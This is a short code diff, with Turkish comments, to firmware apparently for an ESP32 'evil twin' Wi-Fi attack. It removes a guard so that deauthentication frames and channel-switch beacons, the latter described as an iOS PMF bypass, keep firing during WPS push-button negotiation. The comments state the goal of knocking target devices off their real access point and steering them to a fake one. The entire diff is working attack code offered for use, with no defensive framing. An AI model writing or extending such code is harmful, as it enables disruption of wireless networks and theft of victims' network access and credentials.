@@ -537,28 +537,32 @@ void evil_twin_loop() {
 
   unsigned long now = millis();
 
-  // WPS PBC el sıkışması aktifken deauth/CSA GÖNDERİLMEZ.
-  // Deauth ve raw frame enjeksiyonu, STA arayüzünün gerçek AP ile
-  // kurduğu WPS müzakerelerini bozar — özellikle AP→STA ve STA→AP
-  // spoof deauth'lar AP'nin bağlantı durumunu sıfırlar.
-  if (!et_wps_pbc_running) {
-    // CSA beacon: her CSA_INTERVAL_MS ms'de bir — iOS PMF bypass
-    if (now - et_last_csa >= CSA_INTERVAL_MS) {
-      et_last_csa = now;
-      et_send_csa_beacon();
-    }
+  // ── CSA beacon + Proaktif deauth — WPS çalışırken de gönderilir ─────────────
+  // Deauth: WIFI_IF_AP üzerinden gönderilir, WPS'in kullandığı WIFI_IF_STA
+  //         arayüzünden tamamen bağımsızdır — ikisi çakışmaz.
+  // Reaktif deauth (et_sniffer callback): WPS aktifken promiscuous kapalı
+  //         olduğundan zaten tetiklenmez — bu sorun değil; proaktif deauth yeterli.
+  // WiFi.scanNetworks() gerçekten WPS'i bozar, bu yüzden retrack engellenir.
+  //
+  // Önceki hata: if(!et_wps_pbc_running) guard'ı hem deauth hem CSA'yı engelliyordu.
+  // WPS PBC çalıştığı sürece (her zaman — timeout sonrası da yeniden başlıyor)
+  // deauth hiç gönderilmiyordu. Düzeltme: guard kaldırıldı, sadece retrack'te kalıyor.
 
-    // Proaktif deauth: her ET_DEAUTH_INTERVAL_MS ms'de bir
-    // Hedef cihazı gerçek AP'ye bağlanmadan önce düşürür → sahte AP'ye yönlendirir
-    if (now - et_last_deauth >= ET_DEAUTH_INTERVAL_MS) {
-      et_last_deauth = now;
-      et_send_proactive_deauth();
-    }
+  // CSA beacon: her CSA_INTERVAL_MS ms'de bir — iOS PMF bypass
+  if (now - et_last_csa >= CSA_INTERVAL_MS) {
+    et_last_csa = now;
+    et_send_csa_beacon();
+  }
+
+  // Proaktif deauth: her ET_DEAUTH_INTERVAL_MS ms'de bir
+  // Hedef cihazı gerçek AP'ye bağlanmadan önce düşürür → sahte AP'ye yönlendirir
+  if (now - et_last_deauth >= ET_DEAUTH_INTERVAL_MS) {
+    et_last_deauth = now;
+    et_send_proactive_deauth();
   }
 
   // Hedef yeniden bulma: RETRACK_INTERVAL_MS'de bir
-  // WPS çalışırken retrack YAPILMAZ — WiFi.scanNetworks() WPS'i bozar
-  // ve et_start_sniffer() promiscuous modu açarak WPS ile çakışır.
+  // WiFi.scanNetworks() WPS PBC'yi GERÇEKTEN bozar — guard burada kalır.
   if (!et_wps_pbc_running && now - et_last_retrack >= RETRACK_INTERVAL_MS) {
     et_last_retrack = now;
     et_retrack();
